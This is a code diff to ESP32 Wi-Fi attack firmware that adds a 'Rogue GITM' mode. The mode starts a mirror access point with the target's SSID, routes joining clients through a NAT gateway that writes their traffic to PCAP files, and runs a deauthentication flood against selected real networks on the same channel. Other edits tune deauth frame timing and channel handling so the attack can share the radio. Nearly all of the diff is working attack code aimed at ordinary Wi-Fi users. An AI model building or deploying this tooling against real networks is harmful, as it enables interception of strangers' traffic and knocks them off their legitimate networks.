@@ -639,6 +639,7 @@ static httpd_handle_t portal_server = NULL;
 static volatile bool portal_active = false;
 static volatile bool karma_mode_active = false;
 static volatile bool rogueap_mode_active = false;
+static volatile bool rogue_gitm_mode_active = false;
 static TaskHandle_t dns_server_task_handle = NULL;
 static int dns_server_socket = -1;
 
@@ -1503,16 +1504,19 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
     ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);
 
-
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
     if (err == ESP_ERR_NO_MEM) {
-        //give it a breath:
-        vTaskDelay(pdMS_TO_TICKS(20));
-        MY_LOG_INFO(TAG, "esp_wifi_80211_tx returned ESP_ERR_NO_MEM: %d", heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
-        return; // lub ponów próbę później
+        // Wi-Fi driver TX queue full (common under APSTA+NAPT+deauth), not app heap OOM.
+        static int64_t last_nomem_log_us = 0;
+        int64_t now_us = esp_timer_get_time();
+        vTaskDelay(pdMS_TO_TICKS(rogue_gitm_mode_active || capture_gateway_is_active() ? 80 : 20));
+        if (now_us - last_nomem_log_us > 2000000) {
+            last_nomem_log_us = now_us;
+            MY_LOG_INFO(TAG, "esp_wifi_80211_tx returned ESP_ERR_NO_MEM (internal free=%d)",
+                        heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
+        }
+        return;
     }
-
-    //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
 }
 
 /**
@@ -2049,6 +2053,7 @@ static int cmd_boot_button(int argc, char **argv);
 static int cmd_start_portal(int argc, char **argv);
 static int cmd_start_admin_portal(int argc, char **argv);
 static int cmd_start_rogueap(int argc, char **argv);
+static int cmd_start_rogue_gitm(int argc, char **argv);
 static int cmd_start_karma(int argc, char **argv);
 static int cmd_list_sd(int argc, char **argv);
 static int cmd_sd_status(int argc, char **argv);
@@ -5571,8 +5576,11 @@ static void deauth_attack_task(void *pvParameters) {
         }
         
         // Check if it's time for channel monitoring (every 5 minutes)
-        // Only perform periodic re-scan during active deauth attacks (DEAUTH and DEAUTH_EVIL_TWIN)
-        if ((applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) && check_channel_changes()) {
+        // Only perform periodic re-scan during active deauth attacks (DEAUTH and DEAUTH_EVIL_TWIN).
+        // Skip while Capture Gateway / Rogue GITM is active — a scan would disrupt STA/NAPT.
+        if ((applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) &&
+            !capture_gateway_is_active() &&
+            check_channel_changes()) {
             // Set flag to suppress logs during periodic re-scan
             periodic_rescan_in_progress = true;
             
@@ -5632,7 +5640,12 @@ static void deauth_attack_task(void *pvParameters) {
                 } else if (applicationState == DEAUTH_EVIL_TWIN) {
                     char l2[64], l4[64];
                     snprintf(l2, sizeof(l2), ">> %s", target_bssids[0].ssid);
-                    if (last_password_wrong) {
+                    if (rogue_gitm_mode_active) {
+                        capture_gateway_status_t cgw_st = {0};
+                        capture_gateway_get_status(&cgw_st);
+                        snprintf(l4, sizeof(l4), "  Clients: %u", cgw_st.connected_clients);
+                        oled_display_update_full("> Rogue GITM", l2, "  Deauth+GITM", l4);
+                    } else if (last_password_wrong) {
                         snprintf(l4, sizeof(l4), "  Clients: %d", portal_connected_clients);
                         oled_display_update_full("> Evil Twin", l2, "  Wrong password!", l4);
                     } else {
@@ -5648,8 +5661,9 @@ static void deauth_attack_task(void *pvParameters) {
             }
         }
         
-        // Delay and yield to allow UART console processing
-        vTaskDelay(pdMS_TO_TICKS(100));
+        // Delay and yield to allow UART console processing.
+        // Rogue GITM shares the radio with STA/NAPT/PCAP — slow deauth to avoid TX NO_MEM.
+        vTaskDelay(pdMS_TO_TICKS(rogue_gitm_mode_active || capture_gateway_is_active() ? 400 : 100));
         taskYIELD(); // Give other tasks (including console) a chance to run
     }
     
@@ -11789,6 +11803,7 @@ static int cmd_stop(int argc, char **argv) {
             MY_LOG_INFO(TAG, "Capture Gateway stop warning: %s", esp_err_to_name(gateway_err));
         }
     }
+    rogue_gitm_mode_active = false;
 
     // Stop handshake attack task if running
     if (handshake_attack_active || handshake_attack_task_handle != NULL) {
@@ -12126,7 +12141,7 @@ static int cmd_stop(int argc, char **argv) {
         portal_active = false;
         karma_mode_active = false;
         rogueap_mode_active = false;
-        
+
         // Stop DNS server task
         if (dns_server_task_handle != NULL) {
             // Wait for DNS task to finish (it checks portal_active flag)
@@ -12705,6 +12720,7 @@ static const cli_hint_t k_cli_hints[] = {
     { "channel_time", " set <min|max> <ms> | read <min|max>" },
     { "wifi_connect", " <SSID> [Password|--saved] [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]" },
     { "capture_gateway", " start <capture_ssid> [capture_password] [--pcap-name <name>] | status | stop" },
+    { "start_rogue_gitm", " <SSID> <password> [--pcap-name <name>]" },
     { "sd_benchmark", " [size_mb]" },
     { "start_pcap", " radio|net|gateway" },
     { "ota_channel", " [main|dev]" },
@@ -13454,53 +13470,19 @@ static void capture_gateway_print_status(void)
     printf("[CGW] END\n");
 }
 
-static int cmd_capture_gateway(int argc, char **argv)
+/**
+ * Start Capture Gateway SoftAP/NAPT and arm gateway PCAP.
+ * @param password empty string creates an open SoftAP; otherwise WPA2-PSK.
+ * @param normalized_pcap_name empty for automatic sniff_N.pcap naming.
+ * @param oled_title short OLED header (e.g. "> Capture GW").
+ * @return 0 on success.
+ */
+static int capture_gateway_start_session(const char *ssid,
+                                         const char *password,
+                                         const char *normalized_pcap_name,
+                                         const char *oled_title)
 {
-    if (argc < 2) {
-        MY_LOG_INFO(TAG, "Usage: capture_gateway start <capture_ssid> [capture_password] [--pcap-name <name>] | status | stop");
-        return 1;
-    }
-
-    if (strcasecmp(argv[1], "status") == 0) {
-        if (argc != 2) {
-            MY_LOG_INFO(TAG, "Usage: capture_gateway status");
-            return 1;
-        }
-        capture_gateway_print_status();
-        return 0;
-    }
-
-    if (strcasecmp(argv[1], "stop") == 0) {
-        if (argc != 2) {
-            MY_LOG_INFO(TAG, "Usage: capture_gateway stop");
-            return 1;
-        }
-        if (!capture_gateway_is_active()) {
-            MY_LOG_INFO(TAG, "Capture Gateway is not active");
-            return 0;
-        }
-        if (pcap_capture_active && pcap_capture_mode == PCAP_MODE_GATEWAY) {
-            MY_LOG_INFO(TAG, "Gateway PCAP is active. Use 'stop' so the writer and hooks are finalized first.");
-            return 1;
-        }
-
-        esp_err_t err = capture_gateway_stop();
-        esp_err_t mode_err = esp_wifi_set_mode(WIFI_MODE_STA);
-        if (err != ESP_OK) {
-            MY_LOG_INFO(TAG, "Capture Gateway stop warning: %s", esp_err_to_name(err));
-        }
-        if (mode_err != ESP_OK) {
-            MY_LOG_INFO(TAG, "Failed to return WiFi to STA mode: %s", esp_err_to_name(mode_err));
-            return 1;
-        }
-        oled_display_update_full("> Capture GW", "  Gateway stopped", "  STA remains up", "  > Idle");
-        MY_LOG_INFO(TAG, "Capture Gateway stopped; STA connection preserved");
-        printf("[CGW] stopped\n[CGW] END\n");
-        return err == ESP_OK ? 0 : 1;
-    }
-
-    if (strcasecmp(argv[1], "start") != 0 || argc < 3) {
-        MY_LOG_INFO(TAG, "Usage: capture_gateway start <capture_ssid> [capture_password] [--pcap-name <name>] | status | stop");
+    if (ssid == NULL || password == NULL) {
         return 1;
     }
     if (capture_gateway_is_active()) {
@@ -13509,38 +13491,8 @@ static int cmd_capture_gateway(int argc, char **argv)
         return 1;
     }
 
-    size_t ssid_len = strlen(argv[2]);
-    const char *capture_password = "";
-    const char *requested_pcap_name = NULL;
-    for (int i = 3; i < argc; i++) {
-        if (strcmp(argv[i], "--pcap-name") == 0) {
-            if (requested_pcap_name != NULL || i + 1 >= argc) {
-                MY_LOG_INFO(TAG, "--pcap-name requires exactly one filename");
-                return 1;
-            }
-            requested_pcap_name = argv[++i];
-        } else if (strncmp(argv[i], "--", 2) == 0) {
-            MY_LOG_INFO(TAG, "Unexpected option: %s", argv[i]);
-            return 1;
-        } else if (capture_password[0] == '\0') {
-            capture_password = argv[i];
-        } else {
-            MY_LOG_INFO(TAG, "Unexpected argument: %s", argv[i]);
-            return 1;
-        }
-    }
-
-    char normalized_pcap_name[PCAP_BASENAME_MAX_LEN + 1] = {0};
-    if (requested_pcap_name != NULL &&
-        !pcap_normalize_basename(requested_pcap_name, normalized_pcap_name,
-                                 sizeof(normalized_pcap_name))) {
-        MY_LOG_INFO(TAG,
-                    "PCAP name must fit in %d characters including optional .pcap and use only letters, digits, '.', '_' or '-'; paths are not allowed",
-                    PCAP_BASENAME_MAX_LEN);
-        return 1;
-    }
-
-    size_t password_len = strlen(capture_password);
+    size_t ssid_len = strlen(ssid);
+    size_t password_len = strlen(password);
     if (ssid_len == 0 || ssid_len > CAPTURE_GATEWAY_SSID_MAX_LEN ||
         (password_len > 0 &&
          (password_len < CAPTURE_GATEWAY_PASSWORD_MIN_LEN ||
@@ -13593,8 +13545,8 @@ static int cmd_capture_gateway(int argc, char **argv)
     }
 
     capture_gateway_config_t config = {
-        .ssid = argv[2],
-        .password = capture_password,
+        .ssid = ssid,
+        .password = password,
         .channel = upstream_ap.primary,
         .max_clients = CAPTURE_GATEWAY_DEFAULT_MAX_CLIENTS,
     };
@@ -13606,7 +13558,11 @@ static int cmd_capture_gateway(int argc, char **argv)
     }
 
     operation_stop_requested = false;
-    strlcpy(pcap_next_basename, normalized_pcap_name, sizeof(pcap_next_basename));
+    if (normalized_pcap_name != NULL && normalized_pcap_name[0] != '\0') {
+        strlcpy(pcap_next_basename, normalized_pcap_name, sizeof(pcap_next_basename));
+    } else {
+        pcap_next_basename[0] = '\0';
+    }
     char *pcap_argv[] = {"start_pcap", "gateway"};
     if (cmd_start_pcap(2, pcap_argv) != 0) {
         esp_err_t rollback_err = capture_gateway_stop();
@@ -13623,11 +13579,273 @@ static int cmd_capture_gateway(int argc, char **argv)
         return 1;
     }
 
-    oled_display_update_full("> Capture GW", argv[2], "  APSTA + NAPT", "  PCAP armed");
+    oled_display_update_full(oled_title != NULL ? oled_title : "> Capture GW",
+                             ssid, "  APSTA + NAPT", "  PCAP armed");
     MY_LOG_INFO(TAG,
                 "Capture Gateway ready and recording. Any authorized client joining '%s' is captured.",
-                argv[2]);
+                ssid);
     capture_gateway_print_status();
+    return 0;
+}
+
+static int cmd_capture_gateway(int argc, char **argv)
+{
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: capture_gateway start <capture_ssid> [capture_password] [--pcap-name <name>] | status | stop");
+        return 1;
+    }
+
+    if (strcasecmp(argv[1], "status") == 0) {
+        if (argc != 2) {
+            MY_LOG_INFO(TAG, "Usage: capture_gateway status");
+            return 1;
+        }
+        capture_gateway_print_status();
+        return 0;
+    }
+
+    if (strcasecmp(argv[1], "stop") == 0) {
+        if (argc != 2) {
+            MY_LOG_INFO(TAG, "Usage: capture_gateway stop");
+            return 1;
+        }
+        if (!capture_gateway_is_active()) {
+            MY_LOG_INFO(TAG, "Capture Gateway is not active");
+            return 0;
+        }
+        if (pcap_capture_active && pcap_capture_mode == PCAP_MODE_GATEWAY) {
+            MY_LOG_INFO(TAG, "Gateway PCAP is active. Use 'stop' so the writer and hooks are finalized first.");
+            return 1;
+        }
+
+        esp_err_t err = capture_gateway_stop();
+        esp_err_t mode_err = esp_wifi_set_mode(WIFI_MODE_STA);
+        if (err != ESP_OK) {
+            MY_LOG_INFO(TAG, "Capture Gateway stop warning: %s", esp_err_to_name(err));
+        }
+        if (mode_err != ESP_OK) {
+            MY_LOG_INFO(TAG, "Failed to return WiFi to STA mode: %s", esp_err_to_name(mode_err));
+            return 1;
+        }
+        rogue_gitm_mode_active = false;
+        oled_display_update_full("> Capture GW", "  Gateway stopped", "  STA remains up", "  > Idle");
+        MY_LOG_INFO(TAG, "Capture Gateway stopped; STA connection preserved");
+        printf("[CGW] stopped\n[CGW] END\n");
+        return err == ESP_OK ? 0 : 1;
+    }
+
+    if (strcasecmp(argv[1], "start") != 0 || argc < 3) {
+        MY_LOG_INFO(TAG, "Usage: capture_gateway start <capture_ssid> [capture_password] [--pcap-name <name>] | status | stop");
+        return 1;
+    }
+
+    const char *capture_password = "";
+    const char *requested_pcap_name = NULL;
+    for (int i = 3; i < argc; i++) {
+        if (strcmp(argv[i], "--pcap-name") == 0) {
+            if (requested_pcap_name != NULL || i + 1 >= argc) {
+                MY_LOG_INFO(TAG, "--pcap-name requires exactly one filename");
+                return 1;
+            }
+            requested_pcap_name = argv[++i];
+        } else if (strncmp(argv[i], "--", 2) == 0) {
+            MY_LOG_INFO(TAG, "Unexpected option: %s", argv[i]);
+            return 1;
+        } else if (capture_password[0] == '\0') {
+            capture_password = argv[i];
+        } else {
+            MY_LOG_INFO(TAG, "Unexpected argument: %s", argv[i]);
+            return 1;
+        }
+    }
+
+    char normalized_pcap_name[PCAP_BASENAME_MAX_LEN + 1] = {0};
+    if (requested_pcap_name != NULL &&
+        !pcap_normalize_basename(requested_pcap_name, normalized_pcap_name,
+                                 sizeof(normalized_pcap_name))) {
+        MY_LOG_INFO(TAG,
+                    "PCAP name must fit in %d characters including optional .pcap and use only letters, digits, '.', '_' or '-'; paths are not allowed",
+                    PCAP_BASENAME_MAX_LEN);
+        return 1;
+    }
+
+    return capture_gateway_start_session(argv[2], capture_password,
+                                         normalized_pcap_name, "> Capture GW");
+}
+
+static int cmd_start_rogue_gitm(int argc, char **argv)
+{
+    if (argc < 3) {
+        MY_LOG_INFO(TAG, "Usage: start_rogue_gitm <SSID> <password> [--pcap-name <name>]");
+        MY_LOG_INFO(TAG, "Requires wifi_connect first. Optional select_networks for same-channel deauth.");
+        return 1;
+    }
+
+    const char *ssid = argv[1];
+    const char *password = argv[2];
+    const char *requested_pcap_name = NULL;
+    for (int i = 3; i < argc; i++) {
+        if (strcmp(argv[i], "--pcap-name") == 0) {
+            if (requested_pcap_name != NULL || i + 1 >= argc) {
+                MY_LOG_INFO(TAG, "--pcap-name requires exactly one filename");
+                return 1;
+            }
+            requested_pcap_name = argv[++i];
+        } else if (strncmp(argv[i], "--", 2) == 0) {
+            MY_LOG_INFO(TAG, "Unexpected option: %s", argv[i]);
+            return 1;
+        } else {
+            MY_LOG_INFO(TAG, "Unexpected argument: %s", argv[i]);
+            return 1;
+        }
+    }
+
+    size_t ssid_len = strlen(ssid);
+    size_t password_len = strlen(password);
+    if (ssid_len == 0 || ssid_len > CAPTURE_GATEWAY_SSID_MAX_LEN) {
+        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
+        return 1;
+    }
+    if (password_len < CAPTURE_GATEWAY_PASSWORD_MIN_LEN ||
+        password_len > CAPTURE_GATEWAY_PASSWORD_MAX_LEN) {
+        MY_LOG_INFO(TAG, "Password length must be between 8 and 63 characters for WPA2");
+        return 1;
+    }
+
+    char normalized_pcap_name[PCAP_BASENAME_MAX_LEN + 1] = {0};
+    if (requested_pcap_name != NULL &&
+        !pcap_normalize_basename(requested_pcap_name, normalized_pcap_name,
+                                 sizeof(normalized_pcap_name))) {
+        MY_LOG_INFO(TAG,
+                    "PCAP name must fit in %d characters including optional .pcap and use only letters, digits, '.', '_' or '-'; paths are not allowed",
+                    PCAP_BASENAME_MAX_LEN);
+        return 1;
+    }
+
+    if (portal_active) {
+        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+    if (pcap_capture_active) {
+        MY_LOG_INFO(TAG, "PCAP capture already active. Use 'stop' first.");
+        return 1;
+    }
+    if (capture_gateway_is_active()) {
+        MY_LOG_INFO(TAG, "Capture Gateway is already active. Use 'stop' first.");
+        capture_gateway_print_status();
+        return 1;
+    }
+
+    wifi_ap_record_t upstream_ap = {0};
+    esp_netif_ip_info_t upstream_ip = {0};
+    if (current_radio_mode != RADIO_MODE_WIFI || !wifi_initialized ||
+        !capture_gateway_wait_for_upstream(0, &upstream_ap, &upstream_ip)) {
+        MY_LOG_INFO(TAG, "No upstream IPv4 connection. Use 'wifi_connect' first.");
+        return 1;
+    }
+
+    bool deauth_enabled = (g_selected_count > 0);
+    if (deauth_enabled) {
+        if (!g_scan_done) {
+            MY_LOG_INFO(TAG, "No scan results for selected networks. Run scan_networks first.");
+            return 1;
+        }
+        uint8_t upstream_channel = upstream_ap.primary;
+        bool channel_ok = true;
+        bool uplink_collision = false;
+        for (int i = 0; i < g_selected_count; i++) {
+            int idx = g_selected_indices[i];
+            if (idx < 0 || idx >= (int)g_scan_count) {
+                MY_LOG_INFO(TAG, "Invalid selected network index %d", idx);
+                return 1;
+            }
+            const wifi_ap_record_t *ap = &g_scan_results[idx];
+            if (memcmp(ap->bssid, upstream_ap.bssid, 6) == 0) {
+                MY_LOG_INFO(TAG,
+                           "Rogue GITM: selected '%s' (%02X:%02X:%02X:%02X:%02X:%02X) is the STA uplink BSSID — deauth would kill Internet",
+                           ap->ssid,
+                           ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                           ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+                uplink_collision = true;
+            }
+            if (ap->primary != upstream_channel) {
+                MY_LOG_INFO(TAG,
+                           "Rogue GITM: selected '%s' (%02X:%02X:%02X:%02X:%02X:%02X) is on channel %u, upstream is channel %u",
+                           ap->ssid,
+                           ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                           ap->bssid[3], ap->bssid[4], ap->bssid[5],
+                           ap->primary, upstream_channel);
+                channel_ok = false;
+            }
+        }
+        if (uplink_collision) {
+            MY_LOG_INFO(TAG,
+                        "Rogue GITM refused: do not select the upstream STA BSSID for deauth. Use a different uplink (wifi_connect) than the mirror/deauth target.");
+            return 1;
+        }
+        if (!channel_ok) {
+            MY_LOG_INFO(TAG,
+                        "Rogue GITM refused: all selected deauth targets must share the upstream STA channel (%u)",
+                        upstream_channel);
+            return 1;
+        }
+        MY_LOG_INFO(TAG, "Networks selected: %d - deauth will run alongside Rogue GITM on channel %u",
+                    g_selected_count, upstream_channel);
+    } else {
+        MY_LOG_INFO(TAG, "No networks selected - Rogue GITM SoftAP only (no deauth)");
+    }
+
+    int start_err = capture_gateway_start_session(ssid, password, normalized_pcap_name,
+                                                  "> Rogue GITM");
+    if (start_err != 0) {
+        return start_err;
+    }
+
+    rogue_gitm_mode_active = true;
+
+    if (deauth_enabled) {
+        applicationState = DEAUTH_EVIL_TWIN;
+        save_target_bssids();
+        last_channel_check_time = esp_timer_get_time() / 1000;
+
+        MY_LOG_INFO(TAG, "Starting deauth attack on %d network(s):", g_selected_count);
+        for (int i = 0; i < target_bssid_count; i++) {
+            MY_LOG_INFO(TAG, "  [%d] %02X:%02X:%02X:%02X:%02X:%02X (CH %d)",
+                        i + 1,
+                        target_bssids[i].bssid[0], target_bssids[i].bssid[1],
+                        target_bssids[i].bssid[2], target_bssids[i].bssid[3],
+                        target_bssids[i].bssid[4], target_bssids[i].bssid[5],
+                        target_bssids[i].channel);
+        }
+
+        deauth_attack_active = true;
+        BaseType_t result = xTaskCreate(
+            deauth_attack_task,
+            "deauth_task",
+            4096,
+            NULL,
+            5,
+            &deauth_attack_task_handle
+        );
+        if (result != pdPASS) {
+            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
+            deauth_attack_active = false;
+            applicationState = IDLE;
+            MY_LOG_INFO(TAG, "WARNING: Rogue GITM running but deauth attack failed to start");
+        }
+    }
+
+    MY_LOG_INFO(TAG, "Rogue GITM started successfully!");
+    MY_LOG_INFO(TAG, "Mirror SoftAP: %s (WPA2) via Capture Gateway; use 'capture_gateway status' / 'stop'",
+                ssid);
+    esp_err_t led_err = led_set_color(255, 165, 0);
+    if (led_err != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to set LED for Rogue GITM: %s", esp_err_to_name(led_err));
+    }
     return 0;
 }
 
@@ -15908,10 +16126,15 @@ static int cmd_start_pcap(int argc, char **argv) {
         }
 
         if (mode == PCAP_MODE_GATEWAY) {
+            esp_netif_ip_info_t ap_ip = {0};
+            esp_netif_get_ip_info(capture_netif, &ap_ip);
             oled_display_update_full("> PCAP Gateway", "  AP pre-NAT", "  Ethernet RX/TX",
                                      pcap_capture_filepath + 18);
             MY_LOG_INFO(TAG, "PCAP gateway capture started on downstream AP -> %s",
                         pcap_capture_filepath);
+            MY_LOG_INFO(TAG,
+                        "PCAP gateway hooked netif AP IP=" IPSTR " (pre-NAT SoftAP only; no STA ARP-spoof)",
+                        IP2STR(&ap_ip.ip));
             MY_LOG_INFO(TAG, "Capture Gateway adaptive traffic ceiling: %lu kbps",
                         (unsigned long)PCAP_GATEWAY_RATE_LIMIT_KBPS);
         } else {
@@ -23417,6 +23640,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&rogueap_cmd));
 
+    const esp_console_cmd_t rogue_gitm_cmd = {
+        .command = "start_rogue_gitm",
+        .help = "Mirror SoftAP + Capture Gateway (GITM), optional same-channel deauth: start_rogue_gitm <SSID> <password> [--pcap-name <name>]. Requires wifi_connect. No captive portal.",
+        .hint = "<SSID> <password> [--pcap-name <name>]",
+        .func = &cmd_start_rogue_gitm,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&rogue_gitm_cmd));
+
     const esp_console_cmd_t karma_cmd = {
         .command = "start_karma",
         .help = "Starts Karma attack with SSID from probe list: start_karma <index>",
@@ -24180,6 +24412,17 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         return;
     }
 
+    // Capture Gateway / Rogue GITM owns the radio channel (STA+SoftAP). Never hop.
+    const bool gateway_radio_locked =
+        capture_gateway_is_active() || rogue_gitm_mode_active;
+
+    int softap_clients = portal_connected_clients;
+    if (capture_gateway_is_active()) {
+        capture_gateway_status_t cgw_st = {0};
+        capture_gateway_get_status(&cgw_st);
+        softap_clients = cgw_st.connected_clients;
+    }
+
     //proceed with deauth frames on channels of the APs:
     // Use target_bssids[] directly to avoid index confusion after periodic re-scan
     for (int i = 0; i < target_bssid_count; ++i) {
@@ -24198,33 +24441,23 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         
         // Check if BSSID is whitelisted - but ONLY during blackout attack, not during regular deauth
         if (blackout_attack_active && is_bssid_whitelisted(target_bssids[i].bssid)) {
-            // MY_LOG_INFO(TAG, "Skipping whitelisted BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
-            //            target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
-            //            target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5]);
             continue;
         }
         
-        // During evil twin with connected clients, only attack networks on same channel as first selected network
-        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
-            uint8_t first_network_channel = target_bssids[0].channel; // First selected network's channel
+        // During evil twin / Rogue GITM with SoftAP clients, only attack same channel as SoftAP
+        if ((applicationState == DEAUTH_EVIL_TWIN) && softap_clients > 0 && target_bssid_count > 0) {
+            uint8_t first_network_channel = target_bssids[0].channel;
             if (target_bssids[i].channel != first_network_channel) {
-                // Skip networks on different channels when clients are connected
                 continue;
             }
-            // Only send deauth on same channel - no channel switch needed since we're already on this channel
         }
         
-        // Enhanced logging to debug BSSID mismatch issue
-        // MY_LOG_INFO(TAG, "DEAUTH: Sending to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X (target_bssids[%d])",
-        //         target_bssids[i].ssid, target_bssids[i].channel,
-        //         target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
-        //         target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], i);
-        
-        // If no clients connected or not evil twin mode, do normal channel hopping
-        if (portal_connected_clients == 0 || applicationState != DEAUTH_EVIL_TWIN) {
-            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
-            esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE );
-            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
+        // Channel hop only when SoftAP is not serving clients and GITM is not locking the radio
+        if (!gateway_radio_locked &&
+            (softap_clients == 0 || applicationState != DEAUTH_EVIL_TWIN)) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+            esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE);
+            vTaskDelay(pdMS_TO_TICKS(50));
         }
 
         // If stations are selected AND we're in regular DEAUTH mode (not evil_twin/blackout), send targeted deauth
@@ -24249,17 +24482,17 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
             wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
         }
         
-        // If clients are connected during evil twin, immediately return to first network's channel
-        // This ensures we're on the correct channel when clients try to connect to the portal
-        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
+        // If clients are connected during classic evil twin, return to SoftAP channel
+        if (!gateway_radio_locked &&
+            (applicationState == DEAUTH_EVIL_TWIN) && softap_clients > 0 && target_bssid_count > 0) {
             uint8_t first_network_channel = target_bssids[0].channel;
             esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
         }
     }
     
-    // After sending all deauth frames, always return to first network's channel during evil twin
-    // This maximizes probability of being on correct channel when clients try to connect
-    if ((applicationState == DEAUTH_EVIL_TWIN) && target_bssid_count > 0) {
+    // After sending all deauth frames, return to SoftAP channel during classic evil twin only
+    if (!gateway_radio_locked &&
+        (applicationState == DEAUTH_EVIL_TWIN) && target_bssid_count > 0) {
         uint8_t first_network_channel = target_bssids[0].channel;
         esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
     }
